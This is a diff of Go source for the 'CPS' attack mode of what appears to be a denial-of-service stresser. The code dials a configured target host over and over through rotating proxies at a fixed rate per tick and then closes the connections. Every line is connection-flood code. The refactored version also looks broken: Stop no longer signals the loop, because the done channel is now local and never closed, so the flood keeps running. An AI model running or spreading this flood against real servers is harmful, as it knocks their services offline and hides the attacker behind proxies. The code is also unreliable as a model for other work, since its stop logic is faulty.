@@ -10,62 +10,50 @@ type CPS struct {
 	Config     *core.AttackConfig
 	isRunning  bool
 	connBuffer chan net.Conn
-	connPool   chan net.Conn
-	done       chan struct{}
 }
 
 func (c *CPS) Start() {
+	c.connBuffer = make(chan net.Conn, c.Config.PerDelay)
 	c.isRunning = true
-	c.done = make(chan struct{})
-	c.loop()
+	done := make(chan struct{})
+	c.loop(done)
 }
 
-func (c *CPS) loop() {
-	c.connBuffer = make(chan net.Conn, c.Config.PerDelay)
-	c.connPool = make(chan net.Conn, c.Config.PerDelay)
-	for i := 0; i < c.Config.PerDelay; i++ {
-		c.connPool <- c.connect()
-	}
+func (c *CPS) loop(done chan struct{}) {
 	ticker := time.NewTicker(c.Config.Delay)
 	defer ticker.Stop()
 	for {
 		select {
 		case <-ticker.C:
 			for i := 0; i < c.Config.PerDelay; i++ {
-				go c.handleBatch()
+				go c.connect()
 			}
-		case <-c.done:
+			go c.closeChannels()
+		case <-done:
 			return
 		}
 	}
 }
 
-func (c *CPS) connect() net.Conn {
+func (c *CPS) connect() {
 	conn, err := c.Config.ProxyManager.GetNext().Dial()(c.Config.Host)
 	if err != nil {
-		return nil
+		return
 	}
-	return conn
+	c.connBuffer <- conn
 }
 
-func (c *CPS) handleBatch() {
-	conn := <-c.connPool
-	c.connBuffer <- conn
-	batch := make([]net.Conn, 0, c.Config.PerDelay)
-	for i := 0; i < c.Config.PerDelay; i++ {
-		conn, ok := <-c.connBuffer
-		if !ok {
+func (c *CPS) closeChannels() {
+	for i := 0; i < cap(c.connBuffer); i++ {
+		select {
+		case conn := <-c.connBuffer:
+			conn.Close()
+		default:
 			break
 		}
-		batch = append(batch, conn)
-	}
-	for _, conn := range batch {
-		conn.Close()
-		c.connPool <- c.connect()
 	}
 }
 
 func (c *CPS) Stop() {
 	c.isRunning = false
-	close(c.done)
 }
